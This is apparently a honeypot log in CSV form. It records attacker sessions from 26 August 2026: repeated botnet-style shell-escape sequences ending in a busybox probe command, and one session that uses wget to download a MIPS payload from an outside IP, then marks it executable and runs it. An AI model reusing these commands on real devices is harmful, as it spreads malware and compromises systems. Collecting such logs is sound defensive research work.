timestamp,src_ip,session,input,failed
2026-08-26 07:00:25.725858+00:00,101.53.225.48,5e703a8cf21a,start,False
2026-08-26 07:00:25.728353+00:00,101.53.225.48,5e703a8cf21a,start ,True
2026-08-26 07:00:25.729498+00:00,101.53.225.48,5e703a8cf21a,enable,False
2026-08-26 07:00:25.730380+00:00,101.53.225.48,5e703a8cf21a,enable ,True
2026-08-26 07:00:25.731735+00:00,101.53.225.48,5e703a8cf21a,config terminal,False
2026-08-26 07:00:25.732664+00:00,101.53.225.48,5e703a8cf21a,config terminal,True
2026-08-26 07:00:25.733458+00:00,101.53.225.48,5e703a8cf21a,system,False
2026-08-26 07:00:25.734158+00:00,101.53.225.48,5e703a8cf21a,system ,True
2026-08-26 07:00:25.736836+00:00,101.53.225.48,5e703a8cf21a,linuxshell,False
2026-08-26 07:00:25.738193+00:00,101.53.225.48,5e703a8cf21a,linuxshell ,True
2026-08-26 07:00:25.739409+00:00,101.53.225.48,5e703a8cf21a,su,False
2026-08-26 07:00:25.742066+00:00,101.53.225.48,5e703a8cf21a,shell,False
2026-08-26 07:00:25.743176+00:00,101.53.225.48,5e703a8cf21a,shell ,True
2026-08-26 07:00:25.744419+00:00,101.53.225.48,5e703a8cf21a,sh,False
2026-08-26 07:00:25.756584+00:00,101.53.225.48,5e703a8cf21a,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x53\x4f\x59\x44\x4f\x4c',False
2026-08-26 07:08:29.667740+00:00,34.77.23.242,eda7c94a2fb5,PING,False
2026-08-26 07:08:29.669031+00:00,34.77.23.242,eda7c94a2fb5,PING ,True
2026-08-26 07:45:42.727052+00:00,34.140.103.241,87effd14971b,PING,False
2026-08-26 07:45:42.727832+00:00,34.140.103.241,87effd14971b,PING ,True
2026-08-26 08:10:21.253974+00:00,34.76.98.33,63d0668caa1d,PING,False
2026-08-26 08:10:21.254924+00:00,34.76.98.33,63d0668caa1d,PING ,True
2026-08-26 08:16:28.833606+00:00,103.162.41.16,d2346931d910,start,False
2026-08-26 08:16:28.834725+00:00,103.162.41.16,d2346931d910,start ,True
2026-08-26 08:16:28.835660+00:00,103.162.41.16,d2346931d910,enable,False
2026-08-26 08:16:28.836473+00:00,103.162.41.16,d2346931d910,enable ,True
2026-08-26 08:16:28.838308+00:00,103.162.41.16,d2346931d910,config terminal,False
2026-08-26 08:16:28.842580+00:00,103.162.41.16,d2346931d910,config terminal,True
2026-08-26 08:16:28.843917+00:00,103.162.41.16,d2346931d910,system,False
2026-08-26 08:16:28.844880+00:00,103.162.41.16,d2346931d910,system ,True
2026-08-26 08:16:28.846143+00:00,103.162.41.16,d2346931d910,linuxshell,False
2026-08-26 08:16:28.847442+00:00,103.162.41.16,d2346931d910,linuxshell ,True
2026-08-26 08:16:28.848300+00:00,103.162.41.16,d2346931d910,su,False
2026-08-26 08:16:28.849909+00:00,103.162.41.16,d2346931d910,shell,False
2026-08-26 08:16:28.850777+00:00,103.162.41.16,d2346931d910,shell ,True
2026-08-26 08:16:28.851467+00:00,103.162.41.16,d2346931d910,sh,False
2026-08-26 08:16:28.862582+00:00,103.162.41.16,d2346931d910,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x50\x50\x57\x4c\x52\x49',False
2026-08-26 09:04:44.769079+00:00,36.255.33.114,08f653d1b32f,start,False
2026-08-26 09:04:44.770183+00:00,36.255.33.114,08f653d1b32f,start ,True
2026-08-26 09:04:44.771284+00:00,36.255.33.114,08f653d1b32f,enable,False
2026-08-26 09:04:44.772002+00:00,36.255.33.114,08f653d1b32f,enable ,True
2026-08-26 09:04:44.773621+00:00,36.255.33.114,08f653d1b32f,config terminal,False
2026-08-26 09:04:44.774485+00:00,36.255.33.114,08f653d1b32f,config terminal,True
2026-08-26 09:04:44.775398+00:00,36.255.33.114,08f653d1b32f,system,False
2026-08-26 09:04:44.776299+00:00,36.255.33.114,08f653d1b32f,system ,True
2026-08-26 09:04:44.778823+00:00,36.255.33.114,08f653d1b32f,linuxshell,False
2026-08-26 09:04:44.779611+00:00,36.255.33.114,08f653d1b32f,linuxshell ,True
2026-08-26 09:04:44.780390+00:00,36.255.33.114,08f653d1b32f,su,False
2026-08-26 09:04:44.782048+00:00,36.255.33.114,08f653d1b32f,shell,False
2026-08-26 09:04:44.782871+00:00,36.255.33.114,08f653d1b32f,shell ,True
2026-08-26 09:04:44.783613+00:00,36.255.33.114,08f653d1b32f,sh,False
2026-08-26 09:04:44.796182+00:00,36.255.33.114,08f653d1b32f,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x49\x47\x51\x57\x47\x42',False
2026-08-26 09:26:19.663795+00:00,47.245.142.92,4d71c8449900,,False
2026-08-26 11:02:03.831992+00:00,103.149.32.120,a2954c6fa3e6,start,False
2026-08-26 11:02:03.833143+00:00,103.149.32.120,a2954c6fa3e6,start ,True
2026-08-26 11:02:03.834451+00:00,103.149.32.120,a2954c6fa3e6,enable,False
2026-08-26 11:02:03.835333+00:00,103.149.32.120,a2954c6fa3e6,enable ,True
2026-08-26 11:02:03.836854+00:00,103.149.32.120,a2954c6fa3e6,config terminal,False
2026-08-26 11:02:03.837816+00:00,103.149.32.120,a2954c6fa3e6,config terminal,True
2026-08-26 11:02:03.838812+00:00,103.149.32.120,a2954c6fa3e6,system,False
2026-08-26 11:02:03.839581+00:00,103.149.32.120,a2954c6fa3e6,system ,True
2026-08-26 11:02:03.840602+00:00,103.149.32.120,a2954c6fa3e6,linuxshell,False
2026-08-26 11:02:03.841326+00:00,103.149.32.120,a2954c6fa3e6,linuxshell ,True
2026-08-26 11:02:03.842235+00:00,103.149.32.120,a2954c6fa3e6,su,False
2026-08-26 11:02:03.843481+00:00,103.149.32.120,a2954c6fa3e6,shell,False
2026-08-26 11:02:03.844393+00:00,103.149.32.120,a2954c6fa3e6,shell ,True
2026-08-26 11:02:03.845207+00:00,103.149.32.120,a2954c6fa3e6,sh,False
2026-08-26 11:02:03.857422+00:00,103.149.32.120,a2954c6fa3e6,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x44\x4f\x5a\x54\x42\x53',False
2026-08-26 11:02:30.590093+00:00,103.149.32.120,390bb8cbb4b9,start,False
2026-08-26 11:02:30.591655+00:00,103.149.32.120,390bb8cbb4b9,start ,True
2026-08-26 11:02:30.592936+00:00,103.149.32.120,390bb8cbb4b9,enable,False
2026-08-26 11:02:30.593965+00:00,103.149.32.120,390bb8cbb4b9,enable ,True
2026-08-26 11:02:30.595378+00:00,103.149.32.120,390bb8cbb4b9,config terminal,False
2026-08-26 11:02:30.597126+00:00,103.149.32.120,390bb8cbb4b9,config terminal,True
2026-08-26 11:02:30.598656+00:00,103.149.32.120,390bb8cbb4b9,system,False
2026-08-26 11:02:30.599881+00:00,103.149.32.120,390bb8cbb4b9,system ,True
2026-08-26 11:02:30.601505+00:00,103.149.32.120,390bb8cbb4b9,linuxshell,False
2026-08-26 11:02:30.602786+00:00,103.149.32.120,390bb8cbb4b9,linuxshell ,True
2026-08-26 11:02:30.603869+00:00,103.149.32.120,390bb8cbb4b9,su,False
2026-08-26 11:02:30.605845+00:00,103.149.32.120,390bb8cbb4b9,shell,False
2026-08-26 11:02:30.606857+00:00,103.149.32.120,390bb8cbb4b9,shell ,True
2026-08-26 11:02:30.607880+00:00,103.149.32.120,390bb8cbb4b9,sh,False
2026-08-26 11:02:30.618583+00:00,103.149.32.120,390bb8cbb4b9,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x44\x4f\x5a\x54\x42\x53',False
2026-08-26 12:19:30.642700+00:00,72.255.32.51,972784475326,start,False
2026-08-26 12:19:30.643911+00:00,72.255.32.51,972784475326,start ,True
2026-08-26 12:19:30.645500+00:00,72.255.32.51,972784475326,enable,False
2026-08-26 12:19:30.646503+00:00,72.255.32.51,972784475326,enable ,True
2026-08-26 12:19:30.648239+00:00,72.255.32.51,972784475326,config terminal,False
2026-08-26 12:19:30.649101+00:00,72.255.32.51,972784475326,config terminal,True
2026-08-26 12:19:30.650002+00:00,72.255.32.51,972784475326,system,False
2026-08-26 12:19:30.650742+00:00,72.255.32.51,972784475326,system ,True
2026-08-26 12:19:30.651655+00:00,72.255.32.51,972784475326,linuxshell,False
2026-08-26 12:19:30.652360+00:00,72.255.32.51,972784475326,linuxshell ,True
2026-08-26 12:19:30.653075+00:00,72.255.32.51,972784475326,su,False
2026-08-26 12:19:30.654457+00:00,72.255.32.51,972784475326,shell,False
2026-08-26 12:19:30.655271+00:00,72.255.32.51,972784475326,shell ,True
2026-08-26 12:19:30.655855+00:00,72.255.32.51,972784475326,sh,False
2026-08-26 12:19:30.665181+00:00,72.255.32.51,972784475326,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x44\x47\x52\x59\x54',False
2026-08-26 16:02:13.706021+00:00,190.196.253.66,2922e876e8c6,start,False
2026-08-26 16:02:13.707232+00:00,190.196.253.66,2922e876e8c6,start ,True
2026-08-26 16:02:13.708619+00:00,190.196.253.66,2922e876e8c6,enable,False
2026-08-26 16:02:13.709625+00:00,190.196.253.66,2922e876e8c6,enable ,True
2026-08-26 16:02:13.711162+00:00,190.196.253.66,2922e876e8c6,config terminal,False
2026-08-26 16:02:13.712669+00:00,190.196.253.66,2922e876e8c6,config terminal,True
2026-08-26 16:02:13.713869+00:00,190.196.253.66,2922e876e8c6,system,False
2026-08-26 16:02:13.714962+00:00,190.196.253.66,2922e876e8c6,system ,True
2026-08-26 16:02:13.716569+00:00,190.196.253.66,2922e876e8c6,linuxshell,False
2026-08-26 16:02:13.717473+00:00,190.196.253.66,2922e876e8c6,linuxshell ,True
2026-08-26 16:02:13.718491+00:00,190.196.253.66,2922e876e8c6,su,False
2026-08-26 16:02:13.720361+00:00,190.196.253.66,2922e876e8c6,shell,False
2026-08-26 16:02:13.721317+00:00,190.196.253.66,2922e876e8c6,shell ,True
2026-08-26 16:02:13.722114+00:00,190.196.253.66,2922e876e8c6,sh,False
2026-08-26 16:02:13.734706+00:00,190.196.253.66,2922e876e8c6,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4b\x43\x4c\x56\x54\x49',False
2026-08-26 16:02:38.866209+00:00,190.196.253.116,4e164f80746f,start,False
2026-08-26 16:02:38.867350+00:00,190.196.253.116,4e164f80746f,start ,True
2026-08-26 16:02:38.868764+00:00,190.196.253.116,4e164f80746f,enable,False
2026-08-26 16:02:38.869539+00:00,190.196.253.116,4e164f80746f,enable ,True
2026-08-26 16:02:38.871004+00:00,190.196.253.116,4e164f80746f,config terminal,False
2026-08-26 16:02:38.871984+00:00,190.196.253.116,4e164f80746f,config terminal,True
2026-08-26 16:02:38.873132+00:00,190.196.253.116,4e164f80746f,system,False
2026-08-26 16:02:38.874010+00:00,190.196.253.116,4e164f80746f,system ,True
2026-08-26 16:02:38.875307+00:00,190.196.253.116,4e164f80746f,linuxshell,False
2026-08-26 16:02:38.876153+00:00,190.196.253.116,4e164f80746f,linuxshell ,True
2026-08-26 16:02:38.877054+00:00,190.196.253.116,4e164f80746f,su,False
2026-08-26 16:02:38.878564+00:00,190.196.253.116,4e164f80746f,shell,False
2026-08-26 16:02:38.879325+00:00,190.196.253.116,4e164f80746f,shell ,True
2026-08-26 16:02:38.880341+00:00,190.196.253.116,4e164f80746f,sh,False
2026-08-26 16:02:38.892653+00:00,190.196.253.116,4e164f80746f,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4b\x43\x4c\x56\x54\x49',False
2026-08-26 17:19:20.241477+00:00,178.141.242.214,3505d624f233,start,False
2026-08-26 17:19:20.242488+00:00,178.141.242.214,3505d624f233,start ,True
2026-08-26 17:19:20.243536+00:00,178.141.242.214,3505d624f233,enable,False
2026-08-26 17:19:20.244524+00:00,178.141.242.214,3505d624f233,enable ,True
2026-08-26 17:19:20.246031+00:00,178.141.242.214,3505d624f233,config terminal,False
2026-08-26 17:19:20.247038+00:00,178.141.242.214,3505d624f233,config terminal,True
2026-08-26 17:19:20.247986+00:00,178.141.242.214,3505d624f233,system,False
2026-08-26 17:19:20.249087+00:00,178.141.242.214,3505d624f233,system ,True
2026-08-26 17:19:20.250186+00:00,178.141.242.214,3505d624f233,linuxshell,False
2026-08-26 17:19:20.251046+00:00,178.141.242.214,3505d624f233,linuxshell ,True
2026-08-26 17:19:20.251764+00:00,178.141.242.214,3505d624f233,su,False
2026-08-26 17:19:20.253153+00:00,178.141.242.214,3505d624f233,shell,False
2026-08-26 17:19:20.254012+00:00,178.141.242.214,3505d624f233,shell ,True
2026-08-26 17:19:20.255464+00:00,178.141.242.214,3505d624f233,sh,False
2026-08-26 17:19:20.265508+00:00,178.141.242.214,3505d624f233,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4c\x43\x4d\x42\x47\x47',False
2026-08-26 17:20:07.999349+00:00,178.141.242.214,750ce3e63d85,start,False
2026-08-26 17:20:08.000757+00:00,178.141.242.214,750ce3e63d85,start ,True
2026-08-26 17:20:08.002169+00:00,178.141.242.214,750ce3e63d85,enable,False
2026-08-26 17:20:08.003738+00:00,178.141.242.214,750ce3e63d85,enable ,True
2026-08-26 17:20:08.006346+00:00,178.141.242.214,750ce3e63d85,config terminal,False
2026-08-26 17:20:08.007138+00:00,178.141.242.214,750ce3e63d85,config terminal,True
2026-08-26 17:20:08.008926+00:00,178.141.242.214,750ce3e63d85,system,False
2026-08-26 17:20:08.009861+00:00,178.141.242.214,750ce3e63d85,system ,True
2026-08-26 17:20:08.012883+00:00,178.141.242.214,750ce3e63d85,linuxshell,False
2026-08-26 17:20:08.028112+00:00,178.141.242.214,750ce3e63d85,linuxshell ,True
2026-08-26 17:20:08.029327+00:00,178.141.242.214,750ce3e63d85,su,False
2026-08-26 17:20:08.031102+00:00,178.141.242.214,750ce3e63d85,shell,False
2026-08-26 17:20:08.031912+00:00,178.141.242.214,750ce3e63d85,shell ,True
2026-08-26 17:20:08.033223+00:00,178.141.242.214,750ce3e63d85,sh,False
2026-08-26 17:20:08.046524+00:00,178.141.242.214,750ce3e63d85,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4c\x43\x4d\x42\x47\x47',False
2026-08-26 18:39:28.808375+00:00,223.123.124.181,3615283219b9,start,False
2026-08-26 18:39:28.809299+00:00,223.123.124.181,3615283219b9,start ,True
2026-08-26 18:39:28.810508+00:00,223.123.124.181,3615283219b9,enable,False
2026-08-26 18:39:28.811394+00:00,223.123.124.181,3615283219b9,enable ,True
2026-08-26 18:39:28.812909+00:00,223.123.124.181,3615283219b9,config terminal,False
2026-08-26 18:39:28.813680+00:00,223.123.124.181,3615283219b9,config terminal,True
2026-08-26 18:39:28.814569+00:00,223.123.124.181,3615283219b9,system,False
2026-08-26 18:39:28.815380+00:00,223.123.124.181,3615283219b9,system ,True
2026-08-26 18:39:28.816675+00:00,223.123.124.181,3615283219b9,linuxshell,False
2026-08-26 18:39:28.817637+00:00,223.123.124.181,3615283219b9,linuxshell ,True
2026-08-26 18:39:28.818474+00:00,223.123.124.181,3615283219b9,su,False
2026-08-26 18:39:28.819928+00:00,223.123.124.181,3615283219b9,shell,False
2026-08-26 18:39:28.820780+00:00,223.123.124.181,3615283219b9,shell ,True
2026-08-26 18:39:28.821505+00:00,223.123.124.181,3615283219b9,sh,False
2026-08-26 18:39:28.833272+00:00,223.123.124.181,3615283219b9,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4e\x45\x46\x4f\x57\x52',False
2026-08-26 18:40:14.907028+00:00,223.123.124.181,fbb3aeb6d780,start,False
2026-08-26 18:40:14.908058+00:00,223.123.124.181,fbb3aeb6d780,start ,True
2026-08-26 18:40:14.909228+00:00,223.123.124.181,fbb3aeb6d780,enable,False
2026-08-26 18:40:14.910097+00:00,223.123.124.181,fbb3aeb6d780,enable ,True
2026-08-26 18:40:14.911576+00:00,223.123.124.181,fbb3aeb6d780,config terminal,False
2026-08-26 18:40:14.912503+00:00,223.123.124.181,fbb3aeb6d780,config terminal,True
2026-08-26 18:40:14.913501+00:00,223.123.124.181,fbb3aeb6d780,system,False
2026-08-26 18:40:14.914316+00:00,223.123.124.181,fbb3aeb6d780,system ,True
2026-08-26 18:40:14.915498+00:00,223.123.124.181,fbb3aeb6d780,linuxshell,False
2026-08-26 18:40:14.916436+00:00,223.123.124.181,fbb3aeb6d780,linuxshell ,True
2026-08-26 18:40:14.917279+00:00,223.123.124.181,fbb3aeb6d780,su,False
2026-08-26 18:40:14.918839+00:00,223.123.124.181,fbb3aeb6d780,shell,False
2026-08-26 18:40:14.921009+00:00,223.123.124.181,fbb3aeb6d780,shell ,True
2026-08-26 18:40:14.921761+00:00,223.123.124.181,fbb3aeb6d780,sh,False
2026-08-26 18:40:14.929389+00:00,223.123.124.181,fbb3aeb6d780,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4e\x45\x46\x4f\x57\x52',False
2026-08-26 19:21:01.007664+00:00,200.136.108.148,783434340864,uname -a,False
2026-08-26 19:21:02.027258+00:00,200.136.108.148,783434340864,hostname,False
2026-08-26 19:21:02.928728+00:00,200.136.108.148,783434340864,uname -m&&pkill upnpsetup,False
2026-08-26 19:21:04.026596+00:00,200.136.108.148,783434340864,rm ./upnpsetup,False
2026-08-26 19:21:05.242249+00:00,200.136.108.148,783434340864,"wget -nc http://45.87.174.8/k.php?a=mips,E44HQ7OB1KV32114H -O ./upnpsetup",False
2026-08-26 19:21:06.303982+00:00,200.136.108.148,783434340864,chmod 777 ./upnpsetup,False
2026-08-26 19:21:07.474129+00:00,200.136.108.148,783434340864,sudo ./upnpsetup,False
2026-08-26 19:21:07.475205+00:00,200.136.108.148,783434340864,sudo ./upnpsetup,True
2026-08-26 19:21:39.381553+00:00,200.136.108.148,783434340864,./upnpsetup,False
2026-08-26 19:21:39.382919+00:00,200.136.108.148,783434340864,./upnpsetup ,True
2026-08-26 20:05:21.643392+00:00,115.190.238.255,a74028f44126,uname -s -m,False
2026-08-26 20:59:55.094044+00:00,39.34.191.157,8a762b68a27c,start,False
2026-08-26 20:59:55.095188+00:00,39.34.191.157,8a762b68a27c,start ,True
2026-08-26 20:59:55.096509+00:00,39.34.191.157,8a762b68a27c,enable,False
2026-08-26 20:59:55.097415+00:00,39.34.191.157,8a762b68a27c,enable ,True
2026-08-26 20:59:55.098921+00:00,39.34.191.157,8a762b68a27c,config terminal,False
2026-08-26 20:59:55.099944+00:00,39.34.191.157,8a762b68a27c,config terminal,True
2026-08-26 20:59:55.101259+00:00,39.34.191.157,8a762b68a27c,system,False
2026-08-26 20:59:55.102371+00:00,39.34.191.157,8a762b68a27c,system ,True
2026-08-26 20:59:55.103667+00:00,39.34.191.157,8a762b68a27c,linuxshell,False
2026-08-26 20:59:55.104629+00:00,39.34.191.157,8a762b68a27c,linuxshell ,True
2026-08-26 20:59:55.105395+00:00,39.34.191.157,8a762b68a27c,su,False
2026-08-26 20:59:55.106834+00:00,39.34.191.157,8a762b68a27c,shell,False
2026-08-26 20:59:55.107757+00:00,39.34.191.157,8a762b68a27c,shell ,True
2026-08-26 20:59:55.108604+00:00,39.34.191.157,8a762b68a27c,sh,False
2026-08-26 20:59:55.120930+00:00,39.34.191.157,8a762b68a27c,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x45\x55\x46\x43\x55\x57',False
2026-08-26 21:00:13.763986+00:00,39.34.191.157,e7c5d7e3a0f9,start,False
2026-08-26 21:00:13.767546+00:00,39.34.191.157,e7c5d7e3a0f9,start ,True
2026-08-26 21:00:13.768733+00:00,39.34.191.157,e7c5d7e3a0f9,enable,False
2026-08-26 21:00:13.769950+00:00,39.34.191.157,e7c5d7e3a0f9,enable ,True
2026-08-26 21:00:13.771308+00:00,39.34.191.157,e7c5d7e3a0f9,config terminal,False
2026-08-26 21:00:13.772470+00:00,39.34.191.157,e7c5d7e3a0f9,config terminal,True
2026-08-26 21:00:13.773619+00:00,39.34.191.157,e7c5d7e3a0f9,system,False
2026-08-26 21:00:13.774546+00:00,39.34.191.157,e7c5d7e3a0f9,system ,True
2026-08-26 21:00:13.775949+00:00,39.34.191.157,e7c5d7e3a0f9,linuxshell,False
2026-08-26 21:00:13.777622+00:00,39.34.191.157,e7c5d7e3a0f9,linuxshell ,True
2026-08-26 21:00:13.779143+00:00,39.34.191.157,e7c5d7e3a0f9,su,False
2026-08-26 21:00:13.781336+00:00,39.34.191.157,e7c5d7e3a0f9,shell,False
2026-08-26 21:00:13.783086+00:00,39.34.191.157,e7c5d7e3a0f9,shell ,True
2026-08-26 21:00:13.784353+00:00,39.34.191.157,e7c5d7e3a0f9,sh,False
2026-08-26 21:00:13.810843+00:00,39.34.191.157,e7c5d7e3a0f9,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x45\x55\x46\x43\x55\x57',False
2026-08-26 21:00:40.313784+00:00,39.34.191.157,07607dd040e4,start,False
2026-08-26 21:00:40.318420+00:00,39.34.191.157,07607dd040e4,start ,True
2026-08-26 21:00:40.319529+00:00,39.34.191.157,07607dd040e4,enable,False
2026-08-26 21:00:40.321170+00:00,39.34.191.157,07607dd040e4,enable ,True
2026-08-26 21:00:40.323385+00:00,39.34.191.157,07607dd040e4,config terminal,False
2026-08-26 21:00:40.325404+00:00,39.34.191.157,07607dd040e4,config terminal,True
2026-08-26 21:00:40.326605+00:00,39.34.191.157,07607dd040e4,system,False
2026-08-26 21:00:40.329331+00:00,39.34.191.157,07607dd040e4,system ,True
2026-08-26 21:00:40.330911+00:00,39.34.191.157,07607dd040e4,linuxshell,False
2026-08-26 21:00:40.332178+00:00,39.34.191.157,07607dd040e4,linuxshell ,True
2026-08-26 21:00:40.333787+00:00,39.34.191.157,07607dd040e4,su,False
2026-08-26 21:00:40.340737+00:00,39.34.191.157,07607dd040e4,shell,False
2026-08-26 21:00:40.341761+00:00,39.34.191.157,07607dd040e4,shell ,True
